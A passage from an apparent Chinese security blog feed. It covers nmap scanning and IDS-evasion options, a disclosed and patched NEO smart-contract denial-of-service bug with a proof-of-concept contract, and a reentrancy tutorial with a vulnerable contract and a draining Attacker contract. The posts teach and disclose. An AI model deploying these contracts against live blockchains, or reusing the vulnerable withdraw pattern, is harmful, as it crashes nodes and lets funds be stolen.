-T3。数字越大，扫描越快。<br>2比3多花10倍时间，1和2避免IDS告警。</p><p>其他细节设置略过</p><h2 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h2><p>可以 报文分段，诱饵隐蔽，源地址哄骗，使用指定的接口，源端口哄骗，家随机数据，MAC地址哄骗</p><p>其他细节设置略过</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p><code>-oN &lt;filespec&gt;</code>(标准输出)：<br>将标准输出直接写入指定的文件。</p><p><code>-oX &lt;filespec&gt;</code>(XML输出)：<br>要求XML输出直接写入指定的文件。</p><p><code>-v</code>(提高输出信息的详细度)：<br>输出扫描过程的更多信息。可以使用<code>-vv</code>提供更详细的信息</p><p><code>-d [level]</code>(提高或设置调试级别)：<br>输出调试信息</p><p><code>--packet-trace</code>(跟踪发送和接受的报文)：<br>要求Nmap打印发送和接收的每个报文的摘要，通常用于 调试。</p><p><code>--resume &lt;filename&gt;</code>(继续中断的扫描)：<br>可以通过输出的日志文件，继续扫描</p><p>其他细节设置略过</p><h2 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h2><p><code>-A</code> (激烈扫描模式选项)：<br>包括操作系统检测(-O)和版本检测(-sV)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 总归是要补的…. —&lt;br&gt;— 终于补了一波自动化工具的使用 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="tools" scheme="http://lalajun.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞</title>
    <link href="http://lalajun.com/2018/09/15/0day-NEO%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%B9%B3%E5%8F%B0Runtime.Notify()%E8%B0%83%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"/>
    <id>http://lalajun.com/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/</id>
    <published>2018-09-15T09:05:28.000Z</published>
    <updated>2019-11-06T02:41:43.313Z</updated>
    
    <content type="html"><![CDATA[<p>— 发现的第一个0day —</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>在实验室改以太坊的智能合约到neo。<br>改着改着发现一个拒绝服务攻击漏洞，利用攻击的话整个链会全部崩掉，没法出块，危害还挺大的，emmm，在此记录第一个0day。</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><hr><p><strong>漏洞名称</strong>：NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞<br><strong>漏洞影响</strong>：导致Neo链上所有开启<code>log模式</code>的全节点崩溃（包括共识节点）。<br><strong>漏洞细节</strong>：出现在neo全节点虚拟机中执行智能合约语句Runtime.Notify()时发生崩溃</p><p>Neo智能合约平台为合约提供了记录数据信息输出到文件的系统调用<code>System.Runtime.Notify</code>。该调用在处理合约请求时未考虑到全部可能的数据结构，将导致智能合约系统平台crash。</p><p>其产生的影响会根据节点的部署情况而有所不同，但是都较为严重。</p><p>由于Neo目前是有7个主节点负责验证并打包全网交易。恶意用户将利用该漏洞的恶意合约发布到neo网络中，假如超过4个主节点开启了LOG功能，这些节点在解析运行该恶意合约时将引发崩溃，无法继续达成共识，进而导致整个neo网络拒绝服务。</p><p>即使主节点不使用LOG可以完成共识正常出块，但是NEO链中所有NEP5代币智能合约都会使用LOG功能，几乎所有DAPP也会使用LOG功能。所有LOG节点崩溃，会使基于NEO链的大部分智能合约瘫痪。</p><p>崩溃截图：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv94rl0idqj30gq0an0td.jpg" alt="崩溃截图"></p><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>在执行Runtime.Notify没有考虑所有可能被 Runtime.Notify 写入日志文件的数据类型，在数据转化时解析出错。</p><p>Runtime.Notify 是记录智能合约日志的功能，可以输出想要知道的数据的值。类似于<code>console.log()</code>，输出的数据会写入LevevlDB数据库，最后变为一个文件。</p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fv95qd5r2vj30op088t9n.jpg" alt></p><p>判断是否是log模式</p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv95n8ki1dj30p40ag75w.jpg" alt></p><p>构建文件，写入文件</p><p>其中<code>ToParameter函数</code>在转化Map格式时崩溃。</p><blockquote><p>官方回复：因为ToParameter函数在实现的时候还没有Map，后来做了Map功能后忘记更新ToParameter了。</p></blockquote><p>ToParameter函数，在官方github中的NEO项目中<code>ContractParameter.cs</code>、<code>ContractParameterType.cs</code>、<code>Helper.cs</code>实现</p><h2 id="漏洞攻击过程"><a href="#漏洞攻击过程" class="headerlink" title="漏洞攻击过程"></a>漏洞攻击过程</h2><p><code>攻击过程</code>：</p><ul><li>构建恶意智能合约代码</li><li>部署智能合约</li><li>调用恶意智能合约</li><li>所有开启log功能的节点同步区块,执行智能合约代码，崩溃。（如果共识节点开启log功能，会直接崩溃，不会产生区块）</li></ul><p>当时提交的智能合约POC分析：<br>（复杂版，当时没有去看源码觉得有两种漏洞原因，以为可能是跟360找到的漏洞一样，因为map与struct嵌套导致漏洞，也有可能是因为其中一种结构，没有排除到根本）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Neo.SmartContract.Framework;</span><br><span class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.Neo;</span><br><span class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.System;</span><br><span class="line"><span class="keyword">using</span> Helper = Neo.SmartContract.Framework.Helper;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Numerics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NeoContract1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">test</span> : <span class="title">SmartContract</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//结构体</span></span><br><span class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Upload 为键值对 的 Map结构 （map_Up开头）</span></span><br><span class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Purchase 为键值对 的 Map结构 </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Upload结构体</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Upload</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID; <span class="comment">// fileID</span></span><br><span class="line">            <span class="keyword">public</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu;   <span class="comment">//Map结构</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Purchase结构体</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Purchase</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID;</span><br><span class="line">        &#125;</span><br><span class="line">.....省略合约入口.........</span><br><span class="line">        <span class="comment">//攻击调用</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Attack</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu = <span class="keyword">new</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt;();</span><br><span class="line">            <span class="comment">//新建Purchase结构体</span></span><br><span class="line">            Purchase pu = <span class="keyword">new</span> Purchase</span><br><span class="line">            &#123;</span><br><span class="line">                fileID = fileID,</span><br><span class="line">            &#125;;</span><br><span class="line">            map_Pu[fileID] = pu;</span><br><span class="line">            <span class="comment">//新建外部upload结构体</span></span><br><span class="line">            Upload up = <span class="keyword">new</span> Upload</span><br><span class="line">            &#123;</span><br><span class="line">                fileID = fileID,</span><br><span class="line">                map_Pu = map_Pu,</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//存储upload结构体</span></span><br><span class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</span><br><span class="line">            map_Up.Put(fileID, up.Serialize());</span><br><span class="line"></span><br><span class="line">            Runtime.Notify(<span class="string">"OK"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到fileID对应的Upload</span></span><br><span class="line">            Upload map_fileID = GetUpload(fileID);</span><br><span class="line">            <span class="comment">//问题出在这里！！！！！！！！！！！！！！！！此处崩溃</span></span><br><span class="line">            Runtime.Notify(map_fileID);</span><br><span class="line">            Runtime.Notify(map_fileID.fileID);</span><br><span class="line">            <span class="comment">//估计就是两句中上面的第一句</span></span><br><span class="line">            <span class="comment">//可能1. 一个结构体 因为结构中的非法字符 在解析写入文件的时候 导致崩溃 （可能因为结构体 其中包含着不在预期估计范围的作为结构体分割 的字符）</span></span><br><span class="line">            <span class="comment">//可能2. 一个多层嵌套 map struct 的结构体 因为多层嵌套的原因 在解析没有预计 导致崩溃</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到upload的map_Pu 中对应</span></span><br><span class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu_2 = map_fileID.map_Pu;</span><br><span class="line">            Runtime.Notify(map_Pu_2[fileID]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Upload <span class="title">GetUpload</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bytes = map_Up.Get(fileID);</span><br><span class="line">            <span class="keyword">if</span> (bytes.Length &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="keyword">return</span> Helper.Deserialize(bytes) <span class="keyword">as</span> Upload;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Upload();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照官方的原因的话，应该直接建立一个MAP结构，Runtime.Notify(MAP)格式，就可以，不用向上面那么复杂</p><p>贴上攻击结果的一些截图：</p><p>共识节点开启log：<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv96cituh5j311x0k57ts.jpg" alt></p><p>共识节点不开启log：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv96cv6vy6j311y0k81kb.jpg" alt></p><h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>官方于09.10修补了漏洞,添加了map对应处理情况。<a href="https://github.com/neo-project/neo/commit/e5e64ad5d413ad53effb6f815eac579df2c3aaf9#diff-724a2c89065b167abd6abdd780331db8" target="_blank" rel="noopener">修复情况链接</a></p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv98b8qv3ij30ef09vt9c.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv97ec5hi5j30o80g6t9q.jpg" alt></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>很感谢学长和老师（就不贴出名字了）引入门的指导，一直以来的支持和照顾。这也是能发现0day不可或缺的先前条件。</p><p>信息安全就是如此，潜心学习，沉淀，耐心研究，挖掘，总有收获。<br>共勉。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 发现的第一个0day —&lt;/p&gt;
    
    </summary>
    
    
      <category term="0day漏洞" scheme="http://lalajun.com/tags/0day%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="NEO" scheme="http://lalajun.com/tags/NEO/"/>
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>智能合约安全-重入攻击</title>
    <link href="http://lalajun.com/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://lalajun.com/2018/08/29/智能合约安全-重入攻击/</id>
    <published>2018-08-29T09:05:28.000Z</published>
    <updated>2019-08-20T08:24:32.995Z</updated>
    
    <content type="html"><![CDATA[<p>— 有意思，填一小块坑 —</p><a id="more"></a><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直挖着关于智能合约安全问题的坑放在自己的博客列表里，包括什么RPC20代币啦，智能合约函数使用啦，巴拉巴拉。但是一直整块时间去整理。</p><p>今天知道了个有意思的跟CTF题目一样的<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">智能合约漏洞合集网站</a>。做了其中重入攻击的部分。很有意思，还尝试用了下Remix。之后考虑把它刷完。</p><p>那么回归重点。</p><hr><h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p><strong>重入攻击</strong>是一种由于solidity智能合约的特性，再加上智能合约编写不当导致的漏洞。</p><p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的Fallback函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做<strong>重入攻击</strong>。</p><p>在继续之前，我们列出需要解决的问题：</p><ul><li>attack(攻击者合约)如何重入victim(受害者合约)</li><li>为什么attack重入了victim，就会导致漏洞。</li></ul><p>先解决第一个问题，为什么会重入？</p><h2 id="因-Fallback、足够Gas-重入"><a href="#因-Fallback、足够Gas-重入" class="headerlink" title="因 Fallback、足够Gas 重入"></a>因 Fallback、足够Gas 重入</h2><p>受害者合约<code>Victim.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</span><br><span class="line"></span><br><span class="line">contract Victim &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    uint transferAmt = <span class="number">1</span> ether; </span><br><span class="line">    <span class="keyword">if</span> (!msg.sender.call.value(transferAmt)()) <span class="keyword">throw</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上是一个典型的会导致重入的智能合约。</p><p><code>withdraw</code>函数完成了存储在Victim合约中的代币的撤回功能。调用一次，就会转账<code>1 ether</code>到调用者用户。此处的重入攻击会导致调用一次<code>withdraw()</code>转出不只<code>1 ether</code>的钱。<br>（虽然来说这个合约，攻击者完全可以多次调用withdraw来慢慢转钱，但是只是为了演示的智能合约，不用太计较）</p><p>关键原因就是使用<code>call.value()</code>转账，但在此之前需要了解一下<strong>Fallback函数</strong></p><p>首先我们要知道，转账是可以转钱到一个智能合约地址或者一个账户地址。这两个是有所区别的————Fallback函数</p><blockquote><p>合约可以有一个未命名的函数————<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html#fallback" target="_blank" rel="noopener">Fallback函数</a>。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。</p><p>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 payable。 如果不存在这样的函数，则合约不能通过常规交易接收以太币。</p><p>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p></blockquote><p>利用Fallback函数，我们就可以使victim调用攻击合约Fallback函数中的任意代码，但是这是智能合约合理的一些特性。因为如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p><blockquote><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p><p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p><p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p></blockquote><p>可以看出<code>call.value</code>与<code>transfer</code>和<code>send</code>不同，会发送目前拥有的全部的gas，从而使智能合约有足够的gas不断重入。</p><h2 id="编写攻击合约"><a href="#编写攻击合约" class="headerlink" title="编写攻击合约"></a>编写攻击合约</h2><p>那么在攻击合约中使用<strong>payable fallback函数</strong>配合受害合约的转账函数发送全部的Gas。我们就可以有足够的Gas去执行自己的代码————重入。</p><p>在payable fallback函数中，我们选择继续调用受害者合约的<code>withdraw()</code>,再配合一些控制就可以任意通过一次调用，转账出任意多的代币。</p><p><code>attack.sol</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</span><br><span class="line"><span class="comment">//引入受害合约</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./Victim.sol'</span>;</span><br><span class="line"><span class="comment">//攻击</span></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">  <span class="comment">//受害合约实例</span></span><br><span class="line">  Victim v;</span><br><span class="line">  <span class="comment">//重入次数</span></span><br><span class="line">  uint public count;</span><br><span class="line">  <span class="comment">//日志</span></span><br><span class="line">  event LogFallback(uint c, uint balance);</span><br><span class="line">  <span class="comment">//初始化函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params">address victim</span>) </span>&#123;</span><br><span class="line">    v = Victim(victim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//攻击函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    v.withdraw();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//payable fallback函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="comment">//记录日志</span></span><br><span class="line">    LogFallback(count, <span class="keyword">this</span>.balance);</span><br><span class="line">    <span class="comment">//限制转出10个代币</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">10</span>) &#123;</span><br><span class="line">      v.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样子，只需要攻击函数的attack()，我们就可以得到10个ether</p><p>当然，我们目前做的看起来没有意义。我们只是解决了第一个问题：attack(攻击者合约)如何重入victim(受害者合约)？</p><p>那么为什么attack重入了victim，就会导致漏洞转钱很多次？真实情况可不会向之前的合约一样，调用一次就返回给你钱。你调用很多次，就给你很多钱。肯定会有所限制。</p><h2 id="资产记录的修改在转币之后"><a href="#资产记录的修改在转币之后" class="headerlink" title="资产记录的修改在转币之后"></a>资产记录的修改在转币之后</h2><p>取<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">重入题目</a>部分，这更符合真实的场景，也引入重入攻击另一个重要的形成条件。</p><p><code>victim智能合约</code>关键部分如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//账户存储的代币数量（用户账单）</span></span><br><span class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"><span class="comment">//撤回钱，从账上化除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">            _amount;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//收取钱，记账</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">  balances[_to] += msg.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是一个可以接受撤回代币的智能合约。其中有重入漏洞，可以导致一次调用withdraw，多于记录的钱。</p><p>分析其流程：</p><ul><li>判断账目中钱是否够 Y</li><li>转钱</li><li>扣除账目中的钱</li></ul><p>咋一看没什么问题。其中的关键部分就在于 <code>balances[msg.sender] -= _amount;</code>————<strong>资产记录的修改在转币之后</strong> 。</p><p>通常来说，其他语言中这么写问题也不大，因为是同一个函数中，逐步执行的。但是在智能合约中，转账到别人的智能合约中，会调用别的智能合约的fallback函数，就会形成风险。</p><p>在结合之前的重入：<code>.call.value</code>转账导致重入 + <code>资产记录的修改在转币之后</code> 导致重入绕过验证，就可以形成恶意转账，掏空智能合约的所有代币。</p><p>分析其攻击流程（以两层来举例）：</p><ul><li>F1)判断账目中钱是否够 Y</li><li>F1)转钱</li><li>进入攻击函数的fallback函数，重新调用</li><li>F2)判断账目中钱是否够 Y</li><li>F2)转钱</li><li>F2)扣除账目中的钱</li><li>返回攻击函数的fallback函数</li><li>返回原函数</li><li>F1)扣除账目中的钱</li><li>形成溢出</li></ul><hr><h1 id="ethernaut重入题"><a href="#ethernaut重入题" class="headerlink" title="ethernaut重入题"></a>ethernaut重入题</h1><p><a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">重入题目</a></p><h2 id="基于Remix"><a href="#基于Remix" class="headerlink" title="基于Remix"></a>基于Remix</h2><p><a href="http://remix.ethereum.org/#optimize=true&amp;version=soljson-v0.4.18+commit.9cf6e910.js" target="_blank" rel="noopener">Remix在线环境</a></p><p>目标就是从智能合约中偷走全部的钱。<br>以下是目标智能合约代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"><span class="comment">//合约</span></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  <span class="comment">//账本</span></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line">  <span class="comment">//收钱记账</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//查看账本</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//取钱销账</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//fallback收钱函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路比较明显：</p><ul><li>先构造一个攻击合约</li><li>攻击合约触发donate，存入一小部分钱，使之可以满足withdaw的if判断</li><li>攻击合约触发withdraw退钱<ul><li>通过if判断</li><li><code>address.call.value()()</code>转钱进入攻击合约</li><li>执行攻击合约的payable fallback函数的内容</li><li>递归 进入合约的withdraw函数，触发退钱</li></ul></li><li>由于call方法是发送全部的gas。会一直执行到合约被榨干，没有足够的钱，转钱失败。或者gas不够，攻击失败，回滚。</li><li>当转钱失败，执行递归的最里面一层的<code>balances[msg.sender] -= _amount;</code></li><li>一层层回退，不断执行减操作，导致balances[]溢出，变为巨大整数。</li></ul><p>攻击合约构造要点：</p><ul><li>需要引用目标合约</li><li>需要一个函数触发donate</li><li>需要一个函数触发withdraw表示攻击开始</li><li>需要一个函数提取出攻击得到的钱</li></ul><p><strong>坑点</strong>：自己写攻击合约，发现无论怎么样都是失败，也不知道为啥。之后不断翻别人writeup。发现攻击函数中需要调用withdraw两次才能进入payable fallback函数。自己试验了一下，还真是这样，试验截图如下。</p><p><img 